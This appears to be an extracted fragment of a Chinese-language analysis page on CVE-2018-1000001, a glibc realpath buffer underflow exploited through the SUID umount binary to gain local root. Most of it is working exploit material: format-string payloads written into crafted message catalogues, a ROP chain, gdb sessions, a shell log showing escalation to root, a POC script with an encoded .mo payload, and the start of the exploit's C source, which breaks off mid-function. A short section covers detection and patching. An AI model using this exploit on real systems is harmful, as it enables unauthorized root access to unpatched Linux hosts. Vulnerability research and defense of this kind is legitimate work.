LABEL=789abcdef LABEL=789abcdef0 LABEL=789abcdef0    \u5f00\u59cb\u63d0\u6743   \u7b2c0\u6b65\uff0c\u7236\u8fdb\u7a0b\u5f00\u59cb\u6301\u7eed\u8bfb\u53d6umount\u8fdb\u7a0b\u7684\u8f93\u51fa\uff0c\u7b49\u5f85\"AAAAAAAA\"\u5b57\u7b26\u4e32\u7684\u51fa\u73b0  \u7b2c1\u6b65\uff0c\u8bfb\u53d6\u5b8c\u6574\u7684\u6808\u5185\u5b58\u6570\u636e\uff0c\u5e76\u5f00\u59cb\u89e3\u6790\uff0c\u6784\u9020\u7b2c\u4e8c\u9636\u6bb5\u7684util-linx.mo\u6587\u4ef6\u5185\u5bb9\u5e76\u5199\u5165  \u7b2c2\u6b65\uff0c\u6301\u7eed\u7b49\u5f85\uff0c\u76f4\u5230\u5728\u8d85\u65f6\u65f6\u95f4\u5185\uff0c\u7b2c\u4e8c\u9636\u6bb5util-linux.mo\u6587\u4ef6\u5185\u5bb9\u88abumount\u8bfb\u53d6  \u7b2c3\u6b65\uff0c\u8bfb\u53d6\u5269\u4e0b\u7684umount\u8f93\u51fa\u9632\u6b62\u5176\u88ab\u963b\u585e  umount\u90e8\u5206\uff1a   umount\u542f\u52a8\u540e\uff0c\u89e3\u6790\u7b26\u53f7\u94fe\u63a5down\u4f1a\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u4f7f\u5806\u5185\u5b58\u4e2d\u5b58\u653e\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\u5931\u6548\uff0c\u8feb\u4f7f\u5176\u52a0\u8f7d\u4f4d\u4e8e\u76f8\u5bf9\u76ee\u5f55C.UTF-8/LC_MESSAGES/\u4e2d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684 poisonous format string \u4f1a\u5c06\u6808\u5185\u5b58dump\u5230stderr\uff0c\u540c\u65f6\u8fd8\u4f1a\u901a\u8fc7\u6307\u5411\u73af\u5883\u53d8\u91cf\u7684\u6307\u9488\uff0c\u5c06\"AANGUAGE=X.X\"\u4fee\u6539\u4e3a\"LANGUAGE=X.X\"  umount\u7ee7\u7eed\u6267\u884c\uff0c\u7531\u4e8e\u73af\u5883\u53d8\u91cf\u88ab\u4fee\u6539\uff0c\u8fd9\u5c06\u4f7fumount\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5\u7684util-linux.mo\u6587\u4ef6(\u4f4d\u4e8eX.X/LC_MESSAGES\u76ee\u5f55\u4e0b\uff0c\u7531\u4e8e\u8be5\u6587\u4ef6\u4e3afifo named pipe\uff0c\u6240\u4ee5\u8fd9\u91ccumoun\u4f1a\u963b\u585e\u7b49\u5f85\u5176\u88ab\u5199\u5165\u6570\u636e)  umount\u8fdb\u7a0b\u5728\u7236\u8fdb\u7a0b\u7b2c1\u6b65\u5b8c\u6210\u540e\u6062\u590d\u6267\u884c\uff0c\u8bfb\u53d6\u7b2c\u4e8c\u9636\u6bb5mo\u6587\u4ef6\uff0c\u5176\u4e2d\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5c06\u4f1a\u4fee\u6539umount\u7684\u8fd4\u56de\u5730\u5740\uff0c\u901a\u8fc7setdate+execl\u5b9e\u73b0ROP\uff0c\u6700\u7ec8\u6267\u884cDATEMSK\u6587\u4ef6\u4e2d\u7684exp\u8fdb\u7a0b\uff0c\u5229\u7528umount\u63d0\u5347exp\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6743\u9650\u540e\u6267\u884c\uff0c\u751f\u6210root shell\u5b8c\u6210\u63d0\u6743       dump\u6808\u5185\u5b58\uff0c\u4fee\u6539restricted\u5b57\u6bb5\uff0c\u4fee\u6539AANGUAGE\u73af\u5883\u53d8\u91cf\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32    \"AA%6$lnAAAAAA%016lx(\u7701\u7565... \u5171256\u4e2a%016lx)%016lx%1$68hhx%256$hhn\"   \u4fee\u6539\u8fd4\u56de\u5730\u5740\u4f7f\u7528\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32   debian@debian:~/Desktop/work$ msgunfmt \"/proc/1609/cwd/(unreachable)/tmp/__gconv_find_shlib/X.x/LC_MESSAGES/util-linux.mo\" -o util-linux.po\ndebian@debian:~/Desktop/work$ cat util-linux.po \nmsgid \"\"\nmsgstr \"\"\n\"Language: en\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\nmsgstr \"\"\n\"%67$hn%71$hn%1$18640.18640s%68$hn%1$13200.13200s%64$hn%1$906.906s%66$hn%70$hn\"\n\"%1$1567.1567s%65$hn%1$1.1s%69$hn%1$31222.31222s%1$5414.5414s%1$s%1$s%63$hn\"\n\"%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-\"\n\"%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s\\n\"\n\n\nmsgid \"%s: not mounted\"\nmsgstr \"BBBB5678%3$s\\n\"\n\n\nmsgid \"\"\n\"%s: target is busy\\n\"\n\"        (In some cases useful info about processes that\\n\"\n\"         use the device is found by lsof(8) or fuser(1).)\"\nmsgstr \"BBBBABCD%s\\n\"",
            "title": "a. EXP\u539f\u7406"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#b-exp",
            "text": "\u200b   \u590d\u73b0\u73af\u5883exp\uff0c\u89c1\u9644\u4ef6cve-2018-1000001-01.md  \u200b   \u539f\u4f5c\u8005exp:  exp.c",
            "title": "b. EXP\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#c_1",
            "text": "\u642d\u5efa\u590d\u73b0\u73af\u5883\uff0c\u4e0ePOC\u4e2d\u7684\u73af\u5883\u76f8\u540c    \u6b65\u9aa4\u4e00 \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650    # \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone    \u6b65\u9aa4\u4e8c  \u7f16\u8bd1exp\u6587\u4ef6  \u4f7f\u7528\u7684\u662f\u4fee\u6539\u8fc7\u7684exp\uff0c\u5177\u4f53\u4fee\u6539\u4e86\u52a0\u8f7dmo\u7684\u76ee\u5f55\u548cexecl\u7684\u76f8\u5bf9\u504f\u79fb\u4ee5\u9002\u914d\u590d\u73b0\u73af\u5883    gcc exp.c -o exp       \u6b65\u9aa4\u4e09 \u6267\u884cexp   debian@debian:~/Desktop/work$ id\nuid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner)\ndebian@debian:~/Desktop/work$ ./exp\n./exp: invoked as SUID, invoking shell ...\nroot@debian:~/Desktop/work# id\nuid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),113(lpadmin),118(scanner),1000(debian)\nroot@debian:~/Desktop/work#    \u5982\u4f55\u83b7\u53d6util-linx.mo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84   # \u5b9a\u4f4d\u5230_nl_find_msg\u8c03\u7528\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u503c\nchar *_nl_find_msg (struct loaded_l10nfile *domain_file,\n            struct binding *domainbinding, const char *msgid,\n            int convert, size_t *lengthp)\n     internal_function;\n\n\n# Terminal 1\n/usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES\" \"(unreachable)/x\" \nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\necho $$\n46416\n\n\n# Terminal 2\ncd /proc/46416/cwd\ngdb\nfile /bin/umount\nset args --lazy down \nset env LC_ALL=C.UTF-8\nb main\nr\nb *umount_one if *(char *)$rsi == '('\nc\nb mk_exit_code\nc\nb *__dcigettext+1265\nc\n\n\n# \u901a\u8fc7\u8c03\u7528\u4fe1\u606f\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\n\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\"\n# \u56e0\u6b64\u76f8\u5bf9\u8def\u5f84\u5e94\u6539\u4e3a\uff1a__gconv_find_shlib(\u539fexp\u4e2d\u662ffrom_archive)\n[---------------------------------registers-------------------------\n...\nRCX: 0x1 \nRDX: 0x55698c49ee78 (\"%s: not mounted\")\nRSI: 0x55698e233200 (\"AAAAAA/A\")\nRDI: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\n...\nR8 : 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n...\n[-------------------------------------code-------------------------\n...\n=> 0x7fb5d4d69d21 <__dcigettext+1265>:  call   0x7fb5d4d68bc0 <_nl_find_msg>\n ...\nGuessed arguments:\narg[0]: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\narg[1]: 0x55698e233200 (\"AAAAAA/A\")\narg[2]: 0x55698c49ee78 (\"%s: not mounted\")\narg[3]: 0x1 \narg[4]: 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n\n\nBreakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (\n...\ngdb-peda$ \n\n\n# \u8c03\u7528\u6808\u5982\u4e0b\ngdb-peda$ bt\n#0  0x00007fb5d4d69d21 in __dcigettext (\n    domainname=0x55698e233580 \"util-linux\", \n    msgid1=0x55698c49ee78 \"%s: not mounted\", \n    msgid2=0x0, plural=0x0, n=0x0, \n    category=0x5) at dcigettext.c:742\n#1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)\n    at sys-utils/umount.c:206\n#2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...\n#3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...\n#4  0x00007fb5d4d5c2e1 in __libc_start_main (main=0x55698c49c970 ...\n#5  0x000055698c49d3aa in _start ()   \u5982\u4f55\u5728umount\u4e2ddump\u6808\u5185\u5b58\u7684\u4f4d\u7f6e\u4e0b\u65ad\u70b9   gcc my_exp.c -o exp4dbg -g\ngdb\nfile exp4dbg\nb main\nr\nset follow-fork-mode parent\nb attemptEscalation\nc\nset follow-fork-mode child\nc\nb *umount_one if *(char *)$rsi == '('\nc\nb mk_exit_code\nc\nb *mk_exit_code+165\nc\n\n\n=> 0x561465315695 <mk_exit_code+165>: call   0x561465314560 <warnx@plt>\n\n\ngdb-peda$ bt\n#0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...\n#1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...\n#2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, \n...\n#3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...\n#4  0x00005614653153aa in _start ()\ngdb-peda$",
            "title": "c. \u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#d",
            "text": "\u5229\u7528\u8d8a\u754c\u5199\u6f0f\u6d1e\uff0c\u63a7\u5236gettext\u51fd\u6570\u52a0\u8f7d\u7279\u5236\u7684NLS\u6587\u4ef6\uff0c\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32    \u683c\u5f0f\u5316\u5b57\u7b26\u4e32dump\u6808\u5185\u5b58\u6839\u636e\u6808\u5185\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6libc\u57fa\u5730\u5740\u7ed5\u8fc7ASLR    \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4fee\u6539\u6808\u5185\u5b58\u51fd\u6570\u53c2\u6570\u548c\u8fd4\u56de\u5730\u5740\u8fdb\u800c\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b    \u901a\u8fc7setdate\u8fd9\u6837\u7684\u7b80\u5355\u51fd\u6570\u4e3aexecl\u6784\u9020\u5408\u9002\u7684\u6808\u73af\u5883\u5b9e\u73b0ROP    \u901a\u8fc7\u63a7\u5236suid\u8fdb\u7a0bumount\u7684\u6267\u884c\u6d41\u7a0b\u6765\u521b\u5efaroot shell\u5b9e\u73b0\u63d0\u6743",
            "title": "d. \u5229\u7528\u6838\u5fc3\u8981\u7d20"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#5",
            "text": "\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u98ce\u9669\uff0c\u53ca\u65f6\u66f4\u65b0\u7cfb\u7edf\uff0c\u5b89\u88c5\u8865\u4e01\u3002\u68c0\u6d4b\u65b9\u5f0f\u5982\u4e0b\uff1a   # \u65b9\u5f0f\u4e00\uff1a\n# Terminal 1\n$ sudo echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n$ /usr/bin/unshare -m -U --map-root-user /bin/bash\n$ mount -t tmpfs tmpfs /tmp\n$ cd /tmp\n$ echo $$\n2607\n\n# Terminal 2\n$ cd /proc/2607/cwd\n$ realpath .\n(unreachable)/tmp\n# \u5982\u679c\u8fd4\u56de\u503c\u5305\u542b(unreachable)\u5b57\u7b26\u4e32\u5219\u53ef\u4ee5\u5224\u65ad\u5b58\u5728\u98ce\u9669\n\n# \u65b9\u5f0f\u4e8c\uff1a\n# \u67e5\u770bglibc\u7684package\u66f4\u65b0\u65e5\u5fd7\u662f\u5426\u5b58\u5728CVE-2018-1000001\u7684\u8865\u4e01\n# \u4ee5\u5b89\u88c5\u4e86\u8865\u4e01\u7684ubuntu16\u4e3a\u4f8b\uff1a\n$ PAGER=cat apt-get -q=2 changelog libc6\n...\n  * SECURITY UPDATE: Buffer underflow in realpath()\n    - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:\n      Make getcwd(3) fail if it cannot obtain an absolute path\n    - CVE-2018-1000001\n...    \u6839\u636e\u5206\u6790\uff0c\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u5f00\u542funprivileged_userns_clone\u6743\u9650\uff0c\u6240\u4ee5\u5728\u7d27\u6025\u60c5\u51b5\u4e0b\uff0c\u6700\u5feb\u901f\uff0c\u65b9\u4fbf\u7684\u9632\u62a4\u65b9\u5f0f\u662f\u68c0\u67e5\u8be5\u914d\u7f6e\uff0c\u5e76\u786e\u4fdd\u5176\u5728\u4e0d\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u5173\u95ed\u4ee5\u963b\u65ad\u6f0f\u6d1e\u5229\u7528\u7684\u57fa\u7840(\u4f46\u662f\u6b64\u914d\u7f6e\u662f\u67d0\u4e9b\u5bb9\u5668\u5e94\u7528\u7684\u57fa\u7840)\u3002    \u7531\u4e8e\u6f0f\u6d1e\u5229\u7528\u901a\u8fc7\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u5b9e\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\uff0c\u56e0\u6b64\u76d1\u63a7\u7cfb\u7edf\u7684\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u80fd\u591f\u8d77\u5230\u4e00\u5b9a\u4f5c\u7528\u3002\u4f8b\u5982\uff0c\u76d1\u63a7\u8fdb\u7a0b\u8bfb\u53d6\u548c\u521b\u5efa\u7684.mo\u6587\u4ef6\u662f\u5426\u6709\u5f02\u5e38\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32(\u6bd4\u5982\u5305\u542b%n, %$\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32)\uff0c\u53ef\u4ee5\u53ea\u5728\u521b\u5efa\u7684\u65f6\u5019\u68c0\u6d4b\u51cf\u5c11\u6027\u80fd\u635f\u5931\uff1a    root@debian:/usr/share/locale/gl/LC_MESSAGES/# file util-linux.mo\nutil-linux.mo: GNU message catalog (little endian), revision 0.0, 214 messages",
            "title": "5. \u9632\u62a4\u5efa\u8bae"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#6",
            "text": "LibcRealpathBufferUnderflow  https://www.freebuf.com/column/162202.html  https://bbs.pediy.com/thread-228678.htm",
            "title": "6.\u53c2\u8003"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u9644\u4ef6/",
            "text": "Glibc\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u5206\u6790\u9644\u4ef6(CVE-2018-1000001)\n\n\npoc\u6e90\u7801\n\n\n# Line 1\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n# Line 2-5\n/usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\n\n\n# Line 6-9\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\nbase64 -d <<B64-EOF | bzip2 -cd > \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\nQlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\nmQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\niG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\nB64-EOF\necho \"$$\"\n2299\n\n\n# Line 10-11\ntest$ cd /proc/2299/cwd\ntest$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\numount: AAlnAAAAAAAAAAA\n\n\n\n\n\n\nexp\u6e90\u7801\n\n\n/** This software is provided by the copyright owner \"as is\"\n *  and without any expressed or implied warranties, including,\n *  but not limited to, the implied warranties of merchantability\n *  and fitness for a particular purpose are disclaimed. In no\n *  event shall the copyright owner be liable for any direct,\n *  indirect, incidential, special, exemplary or consequential\n *  damages, including, but not limited to, procurement of substitute\n *  goods or services, loss of use, data or profits or business\n *  interruption, however caused and on any theory of liability,\n *  whether in contract, strict liability, or tort, including\n *  negligence or otherwise, arising in any way out of the use\n *  of this software, even if advised of the possibility of such\n *  damage.\n *\n *  Copyright (c) 2018 halfdog <me (%) halfdog.net>\n *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.\n *\n *  This tool exploits a buffer underflow in glibc realpath()\n *  and was tested against latest release from Debian, Ubuntu\n *  Mint. It is intended as demonstration of ASLR-aware exploitation\n *  techniques. It uses relative binary offsets, that may be different\n *  for various Linux distributions and builds. Please send me\n *  a patch when you developed a new set of parameters to add\n *  to the osSpecificExploitDataList structure and want to contribute\n *  them.\n *\n *  Compile: gcc -o RationalLove RationalLove.c\n *  Run: ./RationalLove\n *\n *  You may also use \"--Pid\" parameter, if you want to test the\n *  program on already existing namespaced or chrooted mounts.\n *\n *  Revisions:\n *  * 20180722: Fixed escalation failure on Xenial desktop install\n *    related to definition of \"/\" in \"/run/mount/utab\". Also\n *    fixed compiler warnings.\n */\n\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <poll.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n\n\n\n#define UMOUNT_ENV_VAR_COUNT 256\n\n\n/** Dump that number of bytes from stack to perform anti-ASLR.\n *  This number should be high enough to reproducible reach the\n *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of\n *  environment variable references but low enough to avoid hitting\n *  upper stack limit, which would cause a crash.\n */\n#define STACK_LONG_DUMP_BYTES 4096\n\n\nchar *messageCataloguePreamble=\"Language: en\\n\"\n    \"MIME-Version: 1.0\\n\"\n    \"Content-Type: text/plain; charset=UTF-8\\n\"\n    \"Content-Transfer-Encoding: 8bit\\n\";\n\n\n/** The pid of a namespace process with the working directory\n *  at a writable /tmp only visible by the process. */\npid_t namespacedProcessPid=-1;\n\n\nint killNamespacedProcessFlag=1;\n\n\n/** The pathname to the umount binary to execute. */\nchar *umountPathname;\n\n\n/** The pathname to the named pipe, that will synchronize umount\n *  binary with supervisory process before triggering the second\n *  and last exploitation phase.\n */\nchar *secondPhaseTriggerPipePathname;\n\n\n/** The pathname to the second phase exploitation catalogue file.\n *  This is needed as the catalogue cannot be sent via the trigger\n *  pipe from above.\n */\nchar *secondPhaseCataloguePathname;\n\n\n/** The OS-release detected via /etc/os-release. */\nchar *osRelease=NULL;\n\n\n/** This table contains all relevant information to adapt the\n *  attack to supported Linux distros (fully updated) to support\n *  also older versions, hash of umount/libc/libmount should be\n *  used also for lookups.\n *  The 4th string is an array of 4-byte integers, that are addressed\n *  using the \"ED_...\" constants.\n */\n// Stack offset of libmount ctx pointer when addressing it via\n// printf format string argument skipping syntax, thus causing\n// 8 byte words to be skipped when incrementing by one.\n#define ED_STACK_OFFSET_CTX 0\n// Format string argument skipping for argv array.\n#define ED_STACK_OFFSET_ARGV 1\n// Format string argument skipping for argv[0].\n#define ED_STACK_OFFSET_ARG0 2\n// Delta of getdate() function from __libc_start_main position\n// after return from main().\n#define ED_LIBC_GETDATE_DELTA 3\n// Delta of execl() function from __libc_start_main ...\n#define ED_LIBC_EXECL_DELTA 4\nstatic char* osSpecificExploitDataList[]={\n// Debian Stretch\n    \"\\\"9 (stretch)\\\"\",\n    \"../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\",\n    \"__gconv_find_shlib\",\n    \"\\x06\\0\\0\\0\\x24\\0\\0\\0\\x3e\\0\\0\\0\\x7f\\xb9\\x08\\x00\\xef\\x85\\x09\\x00\",\n    NULL};\n\n\nchar **osReleaseExploitData=NULL;\n\n\n/** Locate the umount binary within the given search path list,\n *  elements separated by colons.\n *  @return a pointer to a malloced memory region containing the\n *  string or NULL if not found.\n */\nchar* findUmountBinaryPathname(char *searchPath) {\n  char *testPathName=(char*)malloc(PATH_MAX);\n  assert(testPathName);\n\n\n  while(*searchPath) {\n    char *endPtr=strchr(searchPath, ':');\n    int length=endPtr-searchPath;\n    if(!endPtr) {\n      length=strlen(searchPath);\n      endPtr=searchPath+length-1;\n    }\n    int result=snprintf(testPathName, PATH_MAX, \"%.*s/%s\", length,\n        searchPath, \"umount\");\n    if(result>=PATH_MAX) {\n      fprintf(stderr, \"Binary search path element too long, ignoring it.\\n\");\n    } else {\n      struct stat statBuf;\n      result=stat(testPathName, &statBuf);\n// Just assume, that umount is owner-executable. There might be\n// alternative ACLs, which grant umount execution only to selected\n// groups, but it would be unusual to have different variants\n// of umount located searchpath on the same host.\n      if((!result)&&(S_ISREG(statBuf.st_mode))&&(statBuf.st_mode&S_IXUSR)) {\n        return(testPathName);\n      }\n    }\n    searchPath=endPtr+1;\n  }\n\n\n  free(testPathName);\n  return(NULL);\n}\n\n\n\n\n/** Get the value for a given field name.\n *  @return NULL if not found, a malloced string otherwise.\n */\nchar* getReleaseFileField(char *releaseData, int dataLength, char *fieldName) {\n  int nameLength=strlen(fieldName);\n  while(dataLength>0) {\n    char *nextPos=memchr(releaseData, '\\n', dataLength);\n    int lineLength=dataLength;\n    if(nextPos) {\n      lineLength=nextPos-releaseData;\n      nextPos++;\n    } else {\n      nextPos=releaseData+dataLength;\n    }\n    if((!strncmp(releaseData, fieldName, nameLength))&&\n        (releaseData[nameLength]=='=')) {\n      return(strndup(releaseData+nameLength+1, lineLength-nameLength-1));\n    }\n    releaseData=nextPos;\n    dataLength-=lineLength;\n  }\n  return(NULL);\n}\n\n\n\n\n/** Detect the release by reading the VERSION field from /etc/os-release.\n *  @return 0 on success.\n */\nint detectOsRelease() {\n  int handle=open(\"/etc/os-release\", O_RDONLY);\n  if(handle<0)\n    return(-1);\n\n\n  char *buffer=alloca(1024);\n  int infoLength=read(handle, buffer, 1024);\n  close(handle);\n  if(infoLength<0)\n    return(-1);\n  osRelease=getReleaseFileField(buffer, infoLength, \"VERSION\");\n  if(!osRelease)\n    osRelease=getReleaseFileField(buffer, infoLength, \"NAME\");\n  if(osRelease) {\n    fprintf(stderr, \"Detected OS version: %s\\n\", osRelease);\n    return(0);\n  }\n\n\n  return(-1);\n}\n\n\n\n\n/** Create the catalogue data in memory.\n *  @return a pointer to newly allocated catalogue data memory\n */\nchar* createMessageCatalogueData(char **origStringList, char **transStringList,\n    int stringCount, int *catalogueDataLength) {\n  int contentLength=strlen(messageCataloguePreamble)+2;\n  for(int stringPos=0; stringPos<stringCount; stringPos++) {\n    contentLength+=strlen(origStringList[stringPos])+\n        strlen(transStringList[stringPos])+2;\n  }\n  int preambleLength=(0x1c+0x14*(stringCount+1)+0xc)&-0xf;\n  char *catalogueData=(char*)malloc(preambleLength+contentLength);\n  memset(catalogueData, 0, preambleLength);\n  int *preambleData=(int*)catalogueData;\n  *preambleData++=0x950412de;\n  preambleData++;\n  *preambleData++=stringCount+1;\n  *preambleData++=0x1c;\n  *preambleData++=(*(preambleData-2))+(stringCount+1)*sizeof(int)*2;\n  *preambleData++=0x5;\n  *preambleData++=(*(preambleData-3))+(stringCount+1)*sizeof(int)*2;\n\n\n  char *nextCatalogueStringStart=catalogueData+preambleLength;\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?\"\":origStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  for(int stringPos=-1; stringPos<stringCount; stringPos++) {\n    char *writeString=(stringPos<0)?messageCataloguePreamble:transStringList[stringPos];\n    int length=strlen(writeString);\n    *preambleData++=length;\n    *preambleData++=(nextCatalogueStringStart-catalogueData);\n    memcpy(nextCatalogueStringStart, writeString, length+1);\n    nextCatalogueStringStart+=length+1;\n  }\n  assert(nextCatalogueStringStart-catalogueData==preambleLength+contentLength);\n  for(int stringPos=0; stringPos<=stringCount+1; stringPos++) {\n//    *preambleData++=(stringPos+1);\n    *preambleData++=(int[]){1, 3, 2, 0, 4}[stringPos];\n  }\n  *catalogueDataLength=preambleLength+contentLength;\n  return(catalogueData);\n}\n\n\n\n\n/** Create the catalogue data from the string lists and write\n *  it to the given file.\n *  @return 0 on success.\n */\nint writeMessageCatalogue(char *pathName, char **origStringList,\n    char **transStringList, int stringCount) {\n  int catalogueFd=open(pathName, O_WRONLY|O_CREAT|O_TRUNC|O_NOCTTY, 0644);\n  if(catalogueFd<0) {\n    fprintf(stderr, \"Failed to open catalogue file %s for writing.\\n\",\n        pathName);\n    return(-1);\n  }\n  int catalogueDataLength;\n  char *catalogueData=createMessageCatalogueData(\n      origStringList, transStringList, stringCount, &catalogueDataLength);\n  int result=write(catalogueFd, catalogueData, catalogueDataLength);\n  assert(result==catalogueDataLength);\n  close(catalogueFd);\n  free(catalogueData);\n  return(0);\n}\n\n\nvoid createDirectoryRecursive(char *namespaceMountBaseDir, char *pathName) {\n  char pathBuffer[PATH_MAX];\n  int pathNameLength=0;\n  while(1) {\n    char *nextPathSep=strchr(pathName+pathNameLength, '/');\n    if(nextPathSep) {\n      pathNameLength=nextPathSep-pathName;\n    } else {\n      pathNameLength=strlen(pathName);\n    }\n    int result=snprintf(pathBuffer, sizeof(pathBuffer), \"%s/%.*s\",\n        namespaceMountBaseDir, pathNameLength, pathName);\n    assert(result<PATH_MAX);\n    result=mkdir(pathBuffer, 0755);\n    assert((!result)||(errno==EEXIST));\n    if(!pathName[pathNameLength])\n      break;\n    pathNameLength++;\n  }\n}\n\n\n\n\n/** This child function prepares the namespaced mount point and\n *  then waits to be killed later on.\n */\nstatic int usernsChildFunction() {\n  while(geteuid()!=0) {\n    sched_yield();\n  }\n  int result=mount(\"tmpfs\", \"/tmp\", \"tmpfs\", MS_MGC_VAL, NULL);\n  assert(!result);\n  assert(!chdir(\"/tmp\"));\n  int handle=open(\"ready\", O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY, 0644);\n  assert(handle>=0);\n  close(handle);\n  sleep(100000);\n}\n\n\n/** Prepare a process living in an own mount namespace and setup\n *  the mount structure appropriately. The process is created\n *  in a way allowing cleanup at program end by just killing it,\n *  thus removing the namespace.\n *  @return the pid of that process or -1 on error.\n */\npid_t prepareNamespacedProcess() {\n  